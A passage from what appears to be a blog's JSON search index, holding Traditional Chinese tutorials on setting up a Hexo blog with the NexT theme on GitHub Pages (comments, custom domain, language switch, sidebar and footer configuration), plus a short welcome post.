Engine\nOptimization)\n剩下的一些小工具\n自訂網域\n\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"Hexo-NexT 留言板 utterances 配置","url":"/NexT-utterances-comment-box/","content":"前言 \n許多 Blog 都有自己的留言區，可以方便地與讀者交流（只是我做了之後文章也沒有人看，所以也不會有交流的機會🥲）我要教的是用 utterances，另外還有其他像是 Disqus 或是 GitHub\nGitalk，但前者會一直有廣告很討厭，後者好像有些資安疑慮（要不然他功能比較多在留言區還可以互相 tag），最後只好就選 utterances，不過他也還是不錯用的，支援 markdown 語法，有亮暗主題，也算很好了啦。\n\n\n安裝\n文章中禁用留言區\n\n安裝 \n先簡單說一下原理，他的留言板就是用 github 的 issue 功能，用你文章的路徑、網址或是標題當作 issue 的 Title，然後把留言的內容當作是 issue 的回覆，所以留言的人就必須要有 github 帳號才能使用\n解說完畢，實作上很簡單，就是來到主題底下的_config.yml 裡將這些改一改，主題你可以自己全部都試試看，他很好心全部都列出來了，repo 要改成你自己的喔，要不然就會跑來我的 issue 了（x\n\n接著到你的隨便一篇文章底下去看，就會發現留言區還是沒出現，因為還要再裝一個utterances，點擊安裝選擇 github\npage 的 repo 然後在點擊安裝就完成了\n\n\nImage\n\n結語 \n可以自己先試試看發個留言（要不然可能他從此都不會被用到），確認都可以用之後，恭喜你就完成留言板嘍！如果有問題或者發現我有哪裡講錯，歡迎大家到底下留言區跟我討論喔～\n\n\nTEST😵‍💫\n\n其他功能 \n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言\n頁底\n utterances 留言板 ✅\nGoogle\nAnalytics 統計網站資訊\n日 / 夜模式\n\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\nSEO：搜尋引擎最佳化 (Search Engine\nOptimization)\n剩下的一些小工具\n自訂網域\n\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"Hexo-NexT 自訂網域","url":"/Hexo-NexT_custom_domain/","content":"前言 \n本來想說預算不足，所以就沒有自己買網域，不過後來發現Github 學生方案中可以在 namecheap 上挑一個免費的網域（另外還有 name.com 也可以，也就是說你可以免費取得兩個網域，超棒的吧～）\n\n\n申請網域\n連結 Github\n\n申請網域 \n申請就是要傳一些證明你是學生的資料，如果沒過的話就多試幾次，過了之後就等一下（我看有人是幾分鐘，有人幾小時，我的話比較久好像快一個禮拜），然後就到 GitHub\nStudent Developer\nPack 裡面找到 namecheap（我覺得這個比 name.com 好用一點，尤其是 ssl 的認證，雖然在這裡是用不到就是了），最後連結 github 帳號，取得折扣碼，然後找想要的網域之後結帳就完成了。\n\n\n連結 github 帳號，取得折扣碼，然後找想要的網域之後結帳就完成了\n\n連結 Github \n到 namecheap 的 domain list 中選取你剛剛申請好的網域\n\n\n到 namecheap 的 domain\nlist 中選取你剛剛申請好的網域\n\n點到裡面的 Advanced DNS，會發現他已經幾乎幫你設定完了，把最底下 CNAME\nRecord 的 Value 設成你的 github page 的網址即可\n\n\n將 CNAME Record 的 Value 設成你的 github\npage 的網址\n\n好的那在 namecheap 這邊已經設置完成，接下來就要到 Github 上了，到你的 repository（然後因為前面的學生方案還會發現你變成 github\npro 了，酷吧），點設定，到 Pages，到 Custom\ndomain 打上申請的網域，接下來他會跑認證，認證之後才可以把 Enforce\nHTTPS 打勾，大概等個半小時，先吃一個下午茶，就會發現你可以打勾了，恭喜，你完成摟～\n\n\n一張圖道盡千言萬語\n\n結語 \n恭喜你有了自己的 Domain，之後遇到人又多了個可以炫耀的東西了呢，另外通過這個機會你也申請到了 Github\nEducation，裡面有很多好用的工具還有教學，真的是撿到寶了，如果你還是高中生，趁這段時間妥善利用這些教學，你應該會變得很強的🛐🛐🛐\n其他功能 \n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言\n頁底\nutterances 留言板\nGoogle\nAnalytics 統計網站資訊\n日 / 夜模式\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\nSEO：搜尋引擎最佳化 (Search Engine\nOptimization)\n剩下的一些小工具\n自訂網域 ✅\n\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"Hexo-NexT 側邊欄 - 切換語言","url":"/NexT-sidebar-switch-lang/","content":"前言 \n為了讓自己網站能夠接軌國際，加個切換語言的功能是必須的吧～\n\n其實切換語言 NexT 有內建的功能，他的效果也還不錯，但是 achieve 不管怎樣都只能出現一個語言，因此最後就只能退而求其次，新做一個英文的網站並在側邊欄新增一個按鈕讓兩個網站可以互相切換，但這要注意一點，就是如果你兩個網站是放在同一個 github 帳號底下的話，pajx 不能打開，因為都是在同一網域底下的，切換過去的時候因為 pajx 的特性，雖然內容會改成英文的，但語言還是會停留在原本的，或是如果有大佬知道怎麼避免掉這種狀況的話，拜託在底下留言告訴我🙏（我自己解決了！看看我下面的更新）\n\n架設一個新的英文網站\n側邊欄新增切換按鈕\n更新 -\n解決使用 pjax 無法切換問題\n\n架設一個新的英文網站 \n這個部分跟先前利用 Hexo\n+ NexT + Github Page 建立自己的\nBlog 完全一樣，要注意一下在最外層資料夾的_config.yml 其中 site 內的 language 要改成 en，網站才會變成英文的，還有記得 branch 要使用 gh-pages，才能正常運作喔\n\n\nlanguage 要改成 en\n\n側邊欄新增切換按鈕 \n換成到 themes 內的_config.yml，這裡先講中文網站要如何配置\n到 menu，新增一個叫做 Switch\nLanguage 的選項（或是其他名字也可以），後面就打你另一個語言網站的名稱，最後一個圖示就看個人喜好要放什麼啦\nmenu:  home: / || fa fa-home  about: /about/ || fa fa-user  tags: /tags/ || fa fa-tags  categories: /categories/ || fa fa-th  archives: /archives/ || fa fa-archive  Switch Language: https://moon-jam.github.io/en/ || fa fa-language\n英文網站的部分也一樣，只是網址記得要改成中文的就好了\nmenu:  home: / || fa fa-home  about: /about/ || fa fa-user  tags: /tags/ || fa fa-tags  categories: /categories/ || fa fa-th  archives: /archives/ || fa fa-archive  Switch Language: https://moon-jam.github.io/ || fa fa-language\n然後當你要新增英文文章時就在英文的那份檔案寫，中文的就在原先的檔案內寫，如此一來就完成中英切換的網站了\n更新 - 解決使用 pjax 無法切換問題\n\n其實很簡單，因為問題是 pjax 在同一個網域底下不會重新整理，所以如果我們只要讓他先導向另一個網域，然後再導回來，就可以解決了，那有什麼快速的方法呢，最直覺的就是縮網址了，這邊因為我怕一般網路上的縮網址可能會有實效性的問題，所以我就到 github 上找了一下，最後決定使用這個gh-pages-url-shortener，新開一個 github 帳號然後複製一個分支，自製縮網址就完成了，所以說現在https://pa-7.github.io/1 就會導向我現在的這個中文網址，https://pa-7.github.io/2 則會到我英文的網站，這樣就這樣就能夠同時使用 pjax 並且避免語言沒有切換到的問題了\n結語 \n切換語言就是這麼簡單，就是在發布不同語言時還要切資料夾有點麻煩，如果有問題或者發現我有哪裡講錯，歡迎大家到底下留言區跟我討論喔～\n其他功能 \n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言 ✅\n頁底\nutterances 留言板\nGoogle\nAnalytics 統計網站資訊\n日 / 夜模式\n\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\nSEO：搜尋引擎最佳化 (Search Engine\nOptimization)\n剩下的一些小工具\n自訂網域\n\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"Hexo-NexT 側邊欄基礎配置","url":"/NexT-sidebar-basic/","content":"前言 \n這篇要介紹的是側邊欄的基礎配置會包含關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結（IG、Gmail…）這些功能，另外本網誌的側邊欄有新增切換語言的功能，有興趣可以看看。\n\n\n關於、標籤、分類、歸檔\n搜尋\n頭像\n個人相關連結\n\n關於、標籤、分類、歸檔 \n首先要生成關於、標籤、分類這三個分頁（但歸檔不用，他預設就有了，我也覺得很奇怪為什麼其他不要預設就生成）\nhexo new page abouthexo new page tagshexo new page categories\n接著應該會發現在 source 裡面多出了三個資料夾\n\n點進去後會發現一個叫做index.html的東西，點進去後輸入以下內容（xxx 依照 about、tags、categories 哪個資料夾填入）\n---type: \"xxx\"layout: \"xxx\"---\n以 about 為例\n---type: \"about\"layout: \"about\"---\n另外，about 裡面要放一些關於自己的一些事的話，就直接接續---，底下繼續撰寫即可，以我的 about 為例\n---type: \"about\"layout: \"about\"---## 我是貓熊🐼這裡會紀錄貓熊的生活大小事\n接著要讓側邊欄顯示關於、標籤、分類、歸檔這些字樣給使用者選用，移駕到你的 theme 主題的_config.yml\n找到 menu，並將 about、tags、categories，取消註解，如下（如果想改圖示的話就就跟頁底配置中更換 icon 一樣，將後面的圖示替換即可）\nmenu:  home: / || fa fa-home  about: /about/ || fa fa-user  tags: /tags/ || fa fa-tags  categories: /categories/ || fa fa-th  archives: /archives/ || fa fa-archive\n恭喜你這樣就完成第一步啦～應該可以在網站上看到這些東西了\n搜尋 \n首先安裝搜尋需要的插件\nnpm install hexo-generator-searchdb\n然後到你的 theme 主題的_config.yml，搜尋local_search，將enable，設為 true，就完成嘍，超簡單的吧～\n# Local Search# Dependencies: https://github.com/next-theme/hexo-generator-searchdblocal_search:  enable: true  # If auto, trigger search by changing input.  # If manual, trigger search by pressing enter key or search button.  trigger: auto  # Show top n results per article, show all results by setting to -1  top_n_per_article: 1  # Unescape html strings to the readable one.  unescape: false  # Preload the search data when the page loads.  preload: false\n頭像 \n這個更簡單，在 theme 主題的_config.yml，搜尋avatar，然後將你想要的頭像放到 theme 主題中/source/images\n\n\n頭像檔案要存放的地方\n\n然後將url後設定為/images/image_name，以我的頭像為例，其檔名叫做Panda_Me.png，而rounded代表是否要顯示在圓框內，rotated表示滑鼠移到頭像上時是否要旋轉\n# Sidebar Avataravatar:  # Replace the default image and set the url here.  url: /images/Panda_Me.png  # If true, the avatar will be displayed in circle.  rounded: true  # If true, the avatar will be rotated with the cursor.  rotated: false\n個人相關連結 \n接下來這是最輕鬆的，一樣在 theme 主題的_config.yml，然後搜尋social，在底下找你想要顯示的網站，取消註解，然後將你的網址打上去即可，以我的為例，我放了 Github、Gmail、IG\n# Social Links# Usage: `Key: permalink || icon`# Key is the link label showing to end users.# Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.social:  GitHub: https://github.com/moon-jam || fab fa-github  Gmail: mailto:wu.messi.wu@gmail.com || fa fa-envelope  #Weibo: https://weibo.com/yourname || fab fa-weibo  #Twitter: https://twitter.com/yourname || fab fa-twitter  #FB Page: https://www.facebook.com/yourname || fab fa-facebook  #StackOverflow: https://stackoverflow.com/yourname || fab fa-stack-overflow  #YouTube: https://youtube.com/yourname || fab fa-youtube  IG: https://www.instagram.com/mooooonjam || fab fa-instagram  #Skype: skype:yourname?call|chat || fab fa-skype\n結語 \n側邊欄的基礎功能都已經配置完畢，看起來已經跟一般的部落格看起來差不多了呢，是不是很簡單啊，如果有發現哪裡講錯或是有任何疑問，都歡迎在底下留言告訴我喔～\n其他功能 \n\n側邊欄\n－ 關於、標籤、分類、歸檔、搜尋 ✅\n－ 切換語言\n頁底\nutterances 留言板\n\nGoogle\nAnalytics 統計網站資訊\n\n日 / 夜模式\n\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\n\nSEO：搜尋引擎最佳化 (Search Engine\nOptimization)\n\n剩下的一些小工具\n\n自訂網域\n\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"Hexo-NexT 網頁頁底配置","url":"/NexT-footer/","content":"前言 \n網站現在基本的都有了，接下來就是來新增一些酷酷的東西了，這篇要講的是頁底，總共會分成底下這幾個部分\n\n\n版權說明、icon、Powered\nby…\n字數統計、估計閱讀時間\n閱覽人數\n\n完成後你的頁底就會變成像這樣嘍\n\n版權說明、icon、Powered by… \n首先先移駕到你的 theme 裡面主題的_config.yml\n\n然後找到footer的位置，應該會看到 since、icon、copyright、powered、beian 這些標題，接下來我會一一進行說明（beian 是所謂的 ICP 備案，是中國對非營利網站的一些規定，詳見這邊，不會影響中國大陸以外地區的網站，所以我就沒有用了，如果要用的話就單純是把你的資訊個別填到裡面去就會出現）\n\n\nsince：你這個網站開始的時間，在你的頁底就會是 XXXX~XXXX，但如果你寫的就是今年他就只會顯示今年的年份，也可以不打，那就是會顯示今年\nicon：這個就是在底下會看到的可愛圖示，預設是愛心，也可以再改成想要的圖案，如果想要改成自己想要的可以到這個網站找找看，然後把另外 animated 就是他會不會在那裡” 跳”!?（自己試試看就知道了），最後一個就顏色，可以自己去查色碼填到裡面去\n\ncopyright：這個就是他為在圖示後面看要不要出現你的名字（名字的設定可以到最外層資料夾的_config 去改喔）\npowered：這裡如果打 true 就會出現由 Powered by Hexo &amp;\nNexT 的字樣，留空就是不會出現\n\n字數統計、估計閱讀時間 \n我們要使用的是這個插件，首先下載\nnpm install hexo-word-counter\n接著在 NexT 內的_config 隨便找個地方貼上這些\nsymbols_count_time:  separated_meta: true  # 在文章顯示時要不要分行  item_text_post: true  # 在文章要不要用文字說明(但我設true跟false都一樣有文字)  item_text_total: true # 在頁底要不要有文字說明\n接著再到最外層資料夾的_config 隨便找個地方貼上這些\nsymbols_count_time:  symbols: true # 在文章顯示總共有多少字  time: true  # 在文章顯示總共需多少時間  total_symbols: true # 在頁底顯示總共有多少字  total_time: true  # 在頁底顯示總共需多少時間  exclude_codeblock: true  # 是否排除程式碼字數  awl: 2 #平均文字長度，中文為 2, 英文為 5, 預設為 4  wpm: 275  # 可以閱讀多少字每分鐘  suffix: \"mins.\" # 時間的後綴\n閱覽人數 \n搜尋busuanzi_count，然後把enable設true就完成了（如果有安裝 live2d 的會有問題，請到這邊來看解決辦法）\n\n結語 \n現在你的頁底是不是變得更好看了呢？如果有問題或者發現我有哪裡講錯，歡迎大家到底下留言區跟我討論喔～\n其他功能 \n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言\n頁底 ✅\nutterances 留言板\n\nGoogle\nAnalytics 統計網站資訊\n\n日 / 夜模式\n\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\n\nSEO：搜尋引擎最佳化 (Search Engine\nOptimization)\n\n剩下的一些小工具\n\n自訂網域\n\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"利用 Hexo + NexT + Github Page 建立自己的 Blog","url":"/Hexo-NexT_Github-Page_build-blog/","content":"前言 \n我的 Blog 就是用 Hexo、NexT、Github\nPage 做出來的，而且不同其他架 Blog 的那種網站，做出來之後你的 Blog 後面會有一個 github.io 的後綴（就像moon-jam.github.io），看起來就很厲害，趁昨天剛做完打第一篇教學文，這東東其實蠻簡單的，很快就有成品了\n\n不過要是你想裝一些酷酷的東西，就有可能搞很久 (最後還是有些沒用出來 QAQ\n如果想要看詳細一點的教學我覺得六角學院的教學影片很棒，跟著做很快就好了，如果覺得我現在的 Blog 哪裡還可以修正，或是覺得我教學哪裡有問題或是有講錯的歡迎在底下留言指教喔～\n教學開始嘍！\n注意事項：這個教學會需要用到 vscode，如果不知道他是什麼或是跟他不熟的，建議先去爬爬文看怎麼用再來看這篇喔～\n建構 Hexo \n需要先裝Node.js 還有Git\n然後從 vscode 開一個資料夾，並在 terminal 打下面這些\nnpm install hexo-cli -ghexo init blog_folder_name  //要換成你自己的資料夾名稱cd blog_folder_path         //要換成你自己的資料夾路徑npm installhexo s\n然後就會看到你的網頁跑出來了\n連接 Github \n首先先到 github 新開一個 Repository（這裡附上本人的Repository）\n\n然後取名叫做 username.github.io\n（username 要改成你自己的，如果要開更多網站的話可以取其他名字，但後面有地方要小改一點）\n選 public，然後其他都不要打勾，完成之後複製這一段\n\n然後接下來就要把資料夾跟 Github 連上，輸入以下這些東西\ngit initgit add.git commit -m \"git init\"git remote add origin Repository_url //Repository_url換成剛剛複製的那個git push -u origin master\n接著到最外層的資料夾應該會看到一個_config.yml，點進去，然後找到 deploy，並修改成下面這樣\ndeploy:  type: git  repo: Repository_url //剛剛複製的那個  branch: master\n這裡要注意一下如果剛剛你 Repository 名字不是叫 username.github.io，要改成這樣子\ndeploy:  type: git  repo: Repository_url //剛剛複製的那個  branch: gh-pages\n此外如果你 Repository 名稱自己取的話還要找到 relative_link，並設定為 true\nrelative_link: true\n最後就可以部署到 github 上去了\nnpm install hexo-deployer-git --savehexo d\n完成之後你打開 username.github.io，應該就會看到你的網頁了🎉（Repository 名稱自己取的則是開啟 username.github.io/Repository_name）\n接下來就可以開始寫部落格了，接下來就來講應該如何新建一片文章，是用 markdown 語法編輯，如果不熟的可以自己去找找文章，網路上蠻多教學的\nhexo new title //會在source資料夾裡面產生一篇檔名叫做title的檔案，使用markdown語法編輯\n完成之後就連打下面三行，就會發現你新的文章已經出現在網站上了 (如果還沒的話就在等一下，他可能還要一些時間，或者你可以在 terminal 打hexo s，就可以在本地看到網站摟)\nhexo cl //clean 刪掉之前的內容，不刪有時候也可以，但有可能會報錯hexo g  //generate 建立網站hexo d  //deploy 部署到github page\n然後如果要傳到 github 上，每次都要git commit -m \"\"、git push實在太累了，這邊我蠻推薦裝vscode 的插件連到 Github，可以直接一鍵上傳\nHexo 設定 \n找到外層資料夾最底下的_config.yml，這邊就講有需要調整的，其他有興趣可以自己玩玩看\n\n\nSite：\n－title 就打你想為網站取的名字\n－subtitle 會顯示在網站 title 的底下，可以留空不會\n－keyword 可打可不打\n－author 打你的想叫的名字，之後如果有地方會用到作者的資訊都會直接從這裡拿\n－language 就選你想要的語言（繁體中文 zh-TW，簡體中文 zh-CN，香港 zh-HK，英文 en）\n－timezone 就留空就好\n\nURL：\n－url 填自己的網域，如果你有自己的網域的話就填自己的（之後如果哪天有的話再個教學\n最後面有教學喔），所以就是填 github page 的網址\n－permalink 是代表你文章的網址要是什麼，預設是年/月/日/文章標題，不過這裡我建議你該城: name/，你也可以用:/title 這是代表用 title 當作網址，但如果是中文的話他會變亂碼，這樣對搜尋優化不好（原本用年月日也會因為層數太多所以讓演算法不喜歡），而且網址也會變比較難看，用: name/的話會用檔案名稱當作網址，只要你檔名取英文的就好了（也有插件是會自己生成一串數字當作網址，但這樣對搜尋優化應該也不太好)\n\n找到 theme 的地方，後面打上主題的資料夾名稱，詳細就看後面的吧\n\n套上主題 \n我是選擇NexT，版型相當的好看，而且很多人用，要找資源也還算好找（這裡可以找其他主題喔）\n\n下載 NexT \ngit clone https://github.com/theme-next/hexo-theme-next themes/NexT\n接著到到最外層資料夾的_config.yml（不是你 theme 裡面的喔）找到 theme 的地方，並設成 NexT\ntheme: NexT\n如果要下載別的主題可以點到進主題的 github，並複製他的網址，然後改成git clone 你想要的主題 themes/你想要的資料夾名稱，然後把_config.yml 中的 theme，並設成你取的資料夾名稱\n再輸入hexo s，就看得到摟，部署到網站上就是在輸入上面那三條\n修改 NexT 主題 \n如果要改 NexT 的主題 (就是上面看到的那四種)，可以到theme/NexT/_config.yml，修改裡面的Scheme Settings，把想要的取消註解，其他全部註解掉（像我就是使用 Pisces）\n\n\n選擇想要的 NexT 主題\n\nNexT 調整 \n這邊我就列出我改的東西跟教學，有興趣的再移過去看摟\n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言\n頁底\nutterances 留言板\nGoogle\nAnalytics 統計網站資訊\n日 / 夜模式\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\nSEO：搜尋引擎最佳化 (Search Engine\nOptimization)\n剩下的一些小工具\n自訂網域\n\n心得 \n這個 Blog 前前後後大概花了 10 個小時，大概有七成時間都是在找 bug🥲，不過成果還算滿意😀。\n期間為了要有一些更酷的功能，所以又找了很多的擴充，然後遇到好多奇怪的狀況，debug 了好久，然後還是有些做不出來，像是那個同一站內切換語言，我看有人做出來，想說應該有插件不會太難，結果我就用了三四個小時有時候切語言只有一半的東西切到，有時候切過去了切不回來，不然就是切過去之後沒有出先該出現的東西，後來實在用不好，所以才變成現在我分成中英兩個站點，然後分兩個地方更新，實在有點麻煩，而且如果要改設定還要改兩次，如果有人知道怎麼用的希望可以在底下跟我說🙏。其實本來還有動態背景跟酷酷的滑鼠爆炸特效，但感覺這樣網站看起來有點小亂，還是簡單一點比較好（枉費我浪費這麼多時間😠\n對了我有用一點點 SEO 優化，不知道哪天我的網站可以在 google 上被搜尋到。之後不知道會不會想要買一個自己的網域，感覺也很酷。\n更新 - 自訂網域 \n麻煩幫我移到這邊看喔～\n參考資料 \n這裡面蠻多是別人的部落格，然後就會被發現我跟他們長差不多，就東抄西抄 XD\nHexo 官方網站\n【學習筆記】如何使用\nHexo + GitHub Pages 架設個人網誌\n使用 Hexo 建構個人化部落格\n(六角學院的教學，基本上就跟著做就完成了)\n使用\nHexo 建置網站（上面影片的上課講義）\n中國的教學，還蠻詳細的但有點舊有些可能要再查一下\n試著學 Hexo\n- NexT 主題篇 - 可以安裝的套件 (他部落格裡面還有很多 Hexo 的教學)\n在\nHexo 的 Next 樣板中引入 utterances 的留言區 | GitHub Issue\n這個是用 Butterfly 做的，做的超猛\nHexo\nNext 8 Language Switch\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"Hello World","url":"/hello-world/","content":"我的網站做好啦～～ \n花了應該快十小時，好累 😮‍💨\n\n看到好多厲害的人都有自己的\nBlog，所以就也做了一個，看來現在我也跟他們一樣厲害了呢\n之後有空應該會竟量寫些東西，讓這邊看起來猛猛ㄉ\n還差 favicon 跟我的頭像都還沒有，之後有了再到這邊放一下好了\n更新 2023/7/8 \n我來放頭像跟 favicon 嘍～因為不會畫畫，所以學了 stable\ndiffusion，不過我電腦很爛，一張 512 * 512 的圖就要快一分鐘，但至少結果看起來還不錯，開心開心～\n\n\n再更新 2023/8/13 \n我有自己的網域啦 https://moon-jam.me，結果這個月更新只有一點點，嗚嗚嗚，本來想說最少每週三更的，但真的太忙了，而且我有點小偷懶🫠，但考慮到要讀書的關係，到有大學之前可能都得這樣佛系更新🥲🥲🥲\n","categories":["熊貓文"],"tags":["熊貓文"]}]